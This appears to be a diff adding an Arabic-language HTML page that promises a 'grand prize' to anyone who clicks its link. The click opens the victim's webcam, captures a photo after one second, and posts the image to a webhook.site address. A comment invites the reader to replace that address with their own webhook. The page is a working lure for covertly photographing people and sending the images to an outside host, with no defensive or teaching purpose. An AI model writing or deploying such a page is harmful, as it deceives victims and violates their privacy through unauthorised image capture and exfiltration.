@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>الجائزة الكبرى</title>
+</head>
+<body>
+  <a href="#" onclick="takePhoto()">إضغط لتحصل على الجائزة الكبرى</a>
+  <br><br>
+  <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+  <script>
+    function takePhoto() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          const video = document.getElementById("video");
+          const canvas = document.getElementById("canvas");
+
+          video.srcObject = stream;
+          video.style.display = "block";
+
+          setTimeout(() => {
+            const context = canvas.getContext("2d");
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            stream.getTracks().forEach(track => track.stop());
+            video.style.display = "none";
+
+            const imageData = canvas.toDataURL("image/png");
+
+            // غيّر الرابط إلى رابط Webhook الخاص بك
+            fetch("https://webhook.site/eaa3f45b-ae24-4c03-8ba7-a383f130b239", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({ image: imageData })
+            });
+
+            alert("تم التقاط الصورة!");
+          }, 1000); // 1 ثانية
+        })
+        .catch(error => {
+          alert("لم يتم تشغيل الكاميرا: " + error);
+        });
+    }
+  </script>
+</body>
+</html>
